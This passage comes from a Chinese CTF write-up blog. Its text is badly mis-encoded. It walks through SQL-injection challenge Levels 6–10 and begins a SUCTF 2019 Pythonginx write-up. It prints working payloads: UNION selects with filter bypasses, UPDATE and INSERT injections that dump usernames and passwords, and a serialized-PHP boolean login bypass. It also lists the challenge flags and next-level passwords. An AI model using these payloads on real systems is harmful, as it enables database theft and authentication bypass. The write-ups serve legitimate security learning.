<p>æ‰€ä»¥å¯¹ç¬¬äºŒä¸ªå­—æ®µè¿›è¡Œæ³¨å…¥ï¼Œæ ¹æ®å¾—åˆ°çš„ç»“æœï¼Œç¬¬äºŒä¸ªå­—æ®µåº”è¯¥æ˜¯usernameï¼Œç„¶ååˆ©ç”¨usernameè¿›è¡Œç¬¬äºŒæ¬¡æŸ¥è¯¢æ•°æ®åº“ï¼Œå¾—åˆ°ä¿¡æ¯ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚çœ‹ï¼š[[SQLæ³¨å…¥æ€»ç»“#åˆ©ç”¨]] <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1%20union%20select%201,admin&#x27;,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16è¿›åˆ¶è½¬æ¢åï¼š?user=-1%20union%20select%201,0x61646d696e27,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line"></span><br><span class="line">?user=-1%20union%20select%201,admin&#x27;#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16è¿›åˆ¶è½¬æ¢åï¼š?user=-1%20union%20select%201,0x61646d696e2723,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°å‰è€…å‡ºç°æŠ¥é”™ï¼Œè€Œåè€…æ²¡æœ‰æŠ¥é”™ã€‚è¯´æ˜ç¡®å®åœ¨ç¬¬äºŒä¸ªå­—æ®µå¤„å­˜åœ¨æ³¨å…¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„æ³¨å…¥è¿‡ç¨‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. æµ‹è¯•å­—æ®µæ•°ï¼š</span><br><span class="line">?user=-1%20union%20select%201,admin&#x27; order by 5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16è¿›åˆ¶è½¬æ¢å:?user=-1%20union%20select%201,0x61646d696e27206f72646572206279203523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>å‘ç°æ˜¾ç¤ºå­—æ®µè¿˜æ˜¯5ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2. æµ‹è¯•æ˜¾ç¤ºä½ï¼š</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,2,3,4,5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16è¿›åˆ¶è½¬æ¢å:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194025.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3. æ˜¾ç¤ºç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,username,3,password,5 from level6_users where status=1#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16è¿›åˆ¶è½¬æ¢å:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194406.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932</span><br><span class="line"></span><br><span class="line">The password for the next level is: shitcoins_are_hold</span><br></pre></td></tr></table></figure>
<h1 id="level-7">Level-7</h1>
<h2 id="é¢˜ç›®æè¿°-6">é¢˜ç›®æè¿°</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195333.png" /></p>
<p>é¢˜ç›®è¦æ±‚ï¼šæŸ¥è¯¢å…³äºgoogleçš„ä¿¡æ¯çš„ä½œè€…ï¼Œè¾“å…¥googleå‘ç°å¾—åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä½†æ˜¯æ²¡æœ‰ä½œè€…ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195818.png" /></p>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹-6">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<p>è¾“å…¥ <code>google'</code> å‘ç°æŠ¥é”™ä¿¡æ¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)&#x27; at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%google&#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)</span><br><span class="line"></span><br><span class="line">å› æ­¤ï¼Œå®Œæ•´çš„æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼šSELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%è¾“å…¥%&#x27; OR text.title LIKE &#x27;%è¾“å…¥%&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯ <code>#</code> ã€<code>ç©ºæ ¼</code> ã€<code>--+</code> éƒ½è¢«è¿‡æ»¤äº†ã€‚ä½†æ˜¯å¯ä»¥ç”¨ <code>%09</code> å’Œ <code>%a0</code> ä»£æ›¿ï¼Œä¸è¿‡æ³¨æ„ä¸€å®šè¦åœ¨burpsuiteä¸­ï¼Œä¸è¦ç›´æ¥åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ï¼Œå¦åˆ™%å·ä¼šè¢«å†æ¬¡urlç¼–ç ã€‚å…¶ä¸­ <code>%09</code> ä¸ºåˆ¶è¡¨ç¬¦ï¼Œåè€…ä¸å¤ªæ‡‚ã€‚</p>
<p>å› æ­¤ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=google%&#x27;)--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203348.png" /></p>
<h2 id="æ³¨å…¥è¿‡ç¨‹-6">æ³¨å…¥è¿‡ç¨‹</h2>
<p>è·å–æ˜¾ç¤ºä½ï¼š å‘ç° order byè¢«è¿‡æ»¤ï¼Œä¸è®ºæ˜¯å¤§å°å†™ã€æ³¨é‡Šéƒ½ä¸è¡Œã€‚é‚£ä¹ˆç›´æ¥ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼Œå¦‚æœä½æ•°ä¸å¯¹ä¹Ÿä¼šæŠ¥é”™ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,4--%a0&amp;dosearch=search%21 -&gt; å››ä¸ªå­—æ®µ</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203641.png" /></p>
<p>è·å–ä½œè€…åå­—ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,autor from level7_news--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203840.png" /></p>
<p>çŒœæµ‹åº”è¯¥æ˜¯ <code>TestUserforg00gle</code>ï¼ŒæˆåŠŸã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80</span><br><span class="line"></span><br><span class="line">The password for the next level is: or_so_i&#x27;m_told</span><br></pre></td></tr></table></figure>
<h1 id="level-8">Level-8</h1>
<h2 id="é¢˜ç›®æè¿°-7">é¢˜ç›®æè¿° â­</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318204016.png" /></p>
<p>è¿™é“é¢˜ç»™å‡ºçš„æ˜¯å…³äº admin çš„ä¿¡æ¯ï¼Œè¿˜æœ‰ç¼–è¾‘çš„æŒ‰é’®ã€‚çŒœæµ‹æœ¬é¢˜åº”è¯¥æ˜¯å…³äºæ•°æ®æ›´æ–°çš„æ³¨å…¥ï¼Œå³ <code>update</code> ï¼Œå‰é¢éƒ½æ˜¯ <code>select</code> çš„ã€‚</p>
<p><code>update</code> çš„è¯­å¥å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=value2,... where column_name3=value;</span><br><span class="line"></span><br><span class="line">å‰é¢çš„column_nameæ˜¯è¦ä¿®æ”¹çš„å­—æ®µï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™valueéœ€è¦åŠ å¼•å·ã€‚åé¢çš„column_name3æ˜¯ç”¨æ¥æ‰¾åˆ°éœ€è¦ä¿®æ”¹çš„ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=column_name4,... where column_name3=value;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318210614.png" /></p>
<p>ä¸Šè¿°è¯­å¥ä¼šå°†å­—æ®µ4çš„å€¼èµ‹ç»™å­—æ®µ2ï¼Œæœ¬é¢˜åº”è¯¥è€ƒå¯Ÿçš„å°±æ˜¯è¿™ä¸ªã€‚</p>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹-7">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<p>ä¾æ¬¡å¯¹æ‰€æœ‰çš„è¾“å…¥æ·»åŠ å•å¼•å·ï¼Œå‘ç°åªæœ‰ Email æŠ¥é”™ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;1&#x27;, age = &#x27;1&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœpayloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;&amp;name=abc&amp;icq=12345&amp;age=90&amp;edit=Edit</span><br></pre></td></tr></table></figure></p>
<p>æŠ¥é”™ä¿¡æ¯ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;12345&#x27;,age = &#x27;90&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¢«å½±å“çš„åªæœ‰ icq å’Œ ageï¼Œè€Œ name æ²¡è¢«å½±å“ï¼Œæ¨æµ‹åå°è¯­å¥å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,emai=&#x27;[input]&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<h2 id="æ³¨å…¥è¿‡ç¨‹-7">æ³¨å…¥è¿‡ç¨‹</h2>
<p>ä¸Šè¿°å¯çŸ¥ï¼Œæˆ‘ä»¬éœ€è¦å°†å¯†ç çš„å€¼èµ‹ç»™4ä¸ªå­—æ®µä¸­çš„å…¶ä¸­ä¸€ä¸ªï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š - icqå’Œageå…¶ä¸­ä¸€ä¸ª</p>
<p>æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸¤ä¸ªå­—æ®µéƒ½åœ¨emailçš„åé¢ï¼Œè¦æƒ³èµ‹å€¼ç»™è¿™ä¸¤ä¸ªå…¶ä¸­ä¹‹ä¸€ï¼Œéœ€è¦åœ¨emailä¸­å†™å®Œä¹‹åï¼Œå°†åé¢çš„æ‰€æœ‰è¯­å¥æ³¨é‡Šæ‰ã€‚å³ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#</span><br><span class="line"></span><br><span class="line">çœŸæ­£æŸ¥è¯¢è¯­å¥ä¸ºï¼šupdate tableName set name=&#x27;[input]&#x27;,emai=&#x27;1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<p>æµ‹è¯•å‘ç°è¿™ç§åšæ³•ä¸è¡Œã€‚æŠ¥é”™ä¿¡æ¯ä¸ºï¼š<code>near 'icq = '12345',age = '90' WHERE id = 1'</code>ã€‚</p>
<ul>
<li>emailå’Œnameå…¶ä¸­ä¸€ä¸ª</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ ¹æ®æŠ¥é”™ä¿¡æ¯ï¼š12345&#x27;,age = &#x27;90&#x27; WHERE id = 1ï¼Œéœ€è¦å°† icq=&#x27; è¡¥é½</span><br><span class="line">1. email=&#x27;,email=password,icq=&#x27;</span><br><span class="line">2. email=1&#x27;,name=password,icq=&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318212222.png" /></p>
<p>æˆåŠŸå¾—åˆ°å¯†ç ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: network_pancakes_milk_and_wine</span><br></pre></td></tr></table></figure></p>
<h3 id="ç–‘æƒ‘ç‚¹">ç–‘æƒ‘ç‚¹ â­</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. email=&#x27;</span><br><span class="line">2. email=&#x27;#</span><br></pre></td></tr></table></figure>
<p>æŠ¥é”™ä¿¡æ¯åˆ†åˆ«ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 12345&#x27; balabala</span><br><span class="line">2. icq=&#x27;12345&#x27; balabala</span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿå°±æ˜¯æ³¨é‡Šç¬¦åªæ³¨é‡Šäº†email=â€™â€˜ ä¸­åé¢çš„å•å¼•å·ã€‚å‰è€…ä¸º <code>(email='')(',icq=')12345'</code>ï¼Œæ‹¬å·åªæ˜¯ä¸ºäº†æ–¹ä¾¿çœ‹ã€‚è€Œåè€…ä¸º <code>(email='')#',icq='12345'</code>ï¼ŒæŒ‰é“ç†åé¢çš„éƒ½åº”è¯¥è¢«æ³¨é‡Šæ‰äº†ï¼Œæˆ‘çš„çŒœæµ‹å¦‚ä¸‹ï¼ˆæœ¬äººphpä»£ç å·®ï¼Œå¦‚æœæœ‰è¯¯è¯·å¤šå¤šæ‰¹è¯„ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,</span><br><span class="line">emai=&#x27;[input]&#x27;,</span><br><span class="line">icq=&#x27;[input]&#x27;,</span><br><span class="line">age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å­æ³¨é‡Šç¬¦å°±åªä¼šæ³¨é‡Šæ‰emailé‚£è¡Œæœ€åé¢çš„å•å¼•å·å’Œé€—å·ï¼Œä»è€ŒæŠ¥é”™ä¿¡æ¯å˜ä¸º <code>icq='12345' balabala</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213900.png" /></p>
<p>å›¾ä¸ŠæŠ¥é”™ä¿¡æ¯ä¸­çš„æ¢è¡Œç¬¦ä¹Ÿåº”è¯äº†æˆ‘çš„çŒœæƒ³ã€‚</p>
<h1 id="level-9">Level-9</h1>
<h2 id="é¢˜ç›®æè¿°-8">é¢˜ç›®æè¿°</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213950.png" /></p>
<p>åœ¨è¾“å…¥æ¡†å¡«å…¥ä¸œè¥¿åï¼Œæäº¤æŸ¥è¯¢ï¼Œå‘ç°å¤šäº†ä¿¡æ¯ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214029.png" /></p>
<p>å› æ­¤çŒœæµ‹åå°ä½¿ç”¨çš„è¯­å¥æ˜¯ <code>insert into</code>ã€‚</p>
<p><code>inser into</code> è¯­å¥æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO è¡¨åç§° VALUES (å€¼1, å€¼2,....)</span><br><span class="line">æŒ‡å®šæ‰€è¦æ’å…¥æ•°æ®çš„åˆ—:</span><br><span class="line">INSERT INTO table_name (åˆ—1, åˆ—2,...) VALUES (å€¼1, å€¼2,....)</span><br><span class="line">ä¸€æ¬¡æ€§æ·»åŠ å¤šä¸ªï¼šï¼ˆæ³¨æ„ï¼Œå¦‚æœæœ‰ä¸»é”®ï¼Œä¸»é”®å¿…é¡»ä¸åŒï¼‰</span><br><span class="line">INSERT INTO table_name (åˆ—1, åˆ—2,...) VALUES (å€¼1, å€¼2,....),(å€¼1, å€¼2,....),(å€¼1, å€¼2,....),...</span><br></pre></td></tr></table></figure>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹-8">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<p>ä¾æ¬¡å¯¹ä¸‰ä¸ªè¾“å…¥æ¡†æ·»åŠ å•å¼•å·ï¼Œå‘ç° <code>autor=1&amp;title=1&amp;text=1'</code> æ—¶å‡ºç°æŠ¥é”™ä¿¡æ¯ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214508.png" /></p>
<p>å•ç‹¬å°†é‡è¦ä¿¡æ¯æå–ï¼š<code>'1'')</code>ï¼Œå¯ä»¥çŒœæµ‹åå°è¯­å¥ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;input&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>è¾“å…¥ <code>autor=1&amp;title=1&amp;text=1')#</code> å‘ç°é¡µé¢æ­£å¸¸ï¼ŒéªŒè¯äº†çŒœæµ‹ã€‚</p>
<h2 id="æ³¨å…¥è¿‡ç¨‹-8">æ³¨å…¥è¿‡ç¨‹</h2>
<p>åˆ©ç”¨ä¸€æ¬¡æ€§æ·»åŠ å¤šä¸ªã€‚</p>
<p>æ„é€ å¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456</span><br></pre></td></tr></table></figure></p>
<p>å¸¦å…¥åä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>æ­£å¥½å°† username å’Œ password ä½œä¸º autor å’Œ title æ˜¾ç¤ºå‡ºæ¥ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220051.png" /></p>
<p>æˆåŠŸç™»å½•ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679</span><br><span class="line"></span><br><span class="line">The password for the next level is: whatever_just_a_fresh_password</span><br></pre></td></tr></table></figure>
<h1 id="level-10">Level-10 â­</h1>
<h2 id="é¢˜ç›®æè¿°-9">é¢˜ç›®æè¿°</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220508.png" /></p>
<p>ç‚¹å‡» login å‘ç°ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220532.png" /></p>
<p>ä¹Ÿå°±æ˜¯è¿™é‡Œéœ€è¦å‚ç›´ææƒã€‚</p>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹-9">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<p>ç”±äºæ²¡æœ‰å¤šä½™çš„ä¿¡æ¯ï¼Œå¹¶ä¸”urlä¹Ÿä¸å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ‰€ä»¥æŠ“åŒ…çœ‹çœ‹ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220631.png" /></p>
<p>ä¸€èˆ¬å‚ç›´ææƒéƒ½æ˜¯çœ‹cookieï¼Œä½†æ˜¯è¿™é‡Œcookieçš„ä¿¡æ¯æ˜¯ç™»å½•æ¯é“é¢˜çš„ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯postä¸­çš„ <code>login</code>ã€‚å°†ä¸Šé¢çš„å­—ç¬¦ä¸²base64è§£ç åå¾—åˆ°ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220733.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œåº”è¯¥éœ€è¦ä¿®æ”¹usernameå’Œpasswordçš„å€¼ï¼Œä¹Ÿå°±æ˜¯ç¬¬2å’Œç¬¬4çš„å†…å®¹ã€‚</p>
<p>ç»è¿‡å¤šæ¬¡æµ‹è¯•ï¼Œè¿˜æ˜¯æ¯«æ— å‘ç°ã€‚å°±å»çœ‹äº†ä¸‹å¤§ä½¬çš„writeupï¼Œæ ¹æ®æ¨æµ‹ï¼Œåå°è¯­å¥ä¸ºï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = unserialize(base64_encode(<span class="variable">$POST</span>[<span class="string">&quot;login&quot;</span>]));</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$input</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$input</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from users where username=<span class="subst">$username</span> and password=<span class="subst">$password</span>&quot;</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>ç”¨æˆ·åä¸ºï¼š<code>TheMaster</code>ã€‚å¯†ç ä¸çŸ¥é“ï¼Œæ‰€ä»¥ password å³ä¸ºæ³¨å…¥ç‚¹ã€‚</p>
<h2 id="æ³¨å…¥è¿‡ç¨‹-9">æ³¨å…¥è¿‡ç¨‹</h2>
<p>æœ¬é¢˜è¦æƒ³æˆåŠŸç™»å½•ï¼Œå°±å¾— where åé¢çš„è¯­å¥ä¸ºçœŸï¼Œå³<code>username=$username</code>å’Œ<code>password=$password</code>åŒæ—¶ä¸ºçœŸã€‚å‰è€…ç®€å•ï¼Œåè€…å¯ä»¥è¿™ä¹ˆæ“ä½œï¼Œå³<code>password=true</code>ï¼Œè¿™æ ·å­å°±èƒ½ç»•è¿‡whereçš„åˆ¤æ–­ã€‚</p>
<p>å› æ­¤æœ€åçš„payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125; </span><br><span class="line">è§£é‡Šï¼šboolå‹çš„å°±æ˜¯bï¼Œä¸”trueä¸º1ï¼Œfalseä¸º0</span><br></pre></td></tr></table></figure></p>
<p>ç»è¿‡base64ç¼–ç åå¸¦å…¥å³å¯æˆåŠŸç™»å½•ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52  </span><br><span class="line"></span><br><span class="line">The password for the hall of fame is: make_the_internet_great_again</span><br></pre></td></tr></table></figure>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>ç»è¿‡è¿™åé“é¢˜ï¼Œå‘ç°sqlæ³¨å…¥ä¸ä»…ä»…æ˜¯å¸¸è§„ç±»å‹çš„è€ƒå¯Ÿï¼Œè¿˜æœ‰ä¸åŒè¯­å¥ï¼Œå¦‚ï¼šupdateï¼Œinsert intoç­‰ã€‚æœ‰æ—¶å€™è¿˜è¦çŒœæµ‹åå°è¯­å¥çš„å†™æ³•ï¼Œæˆ–è€…åƒ Level-6ä¸€æ ·ï¼Œæ³¨å…¥è¯­å¥ä¸­è¿”å›çš„ç»“æœä½œä¸ºè¾“å…¥äºŒæ¬¡æŸ¥è¯¢ï¼Œè¿˜å¾—æ˜ç™½å¸¸è§çš„åå°åˆ¤æ–­ã€‚æ€»ä¹‹ï¼Œæ”¶è·è‰¯å¤šï¼Œæ˜¯å¾ˆå¥½çš„é¢˜ç›®ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>SQLæ³¨å…¥</tag>
        <tag>Webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF 2019 Pythonginx</title>
    <url>/2022/04/16/SUCTF%202019%20Pythonginx/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BSUCTF%202019%5DPythonginx">Pythonginx</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¹‹åï¼Œç›´æ¥ç»™äº†ä»£ç ï¼Œä¸è¿‡æ ¼å¼å¾ˆä¹±ï¼ŒæŸ¥çœ‹é¡µé¢æºç å¯ä»¥å¾—åˆ°æ•´é½çš„ä»£ç  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname <span class="comment"># æå–urlä¸­çš„hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:  <span class="comment"># ç»•è¿‡1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url)) <span class="comment"># å°†urlåˆ†å‰²</span></span><br><span class="line">    host = parts[<span class="number">1</span>] <span class="comment"># å–å…¶ä¸­çš„ç¬¬äºŒä¸ªå…¶å®å’Œ</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: <span class="comment"># ç»•è¿‡2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): <span class="comment"># å°†parts[1]ä»¥ . åˆ†å‰²</span></span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    </span><br><span class="line">    åˆ°æ­¤ä¸ºæ­¢ï¼Œè¿˜æ˜¯parts[<span class="number">1</span>]å¾—åˆ°çš„æ˜¯å›½é™…æ ‡å‡†åŒ–çš„hostname</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()  <span class="comment"># get flag</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure></p>
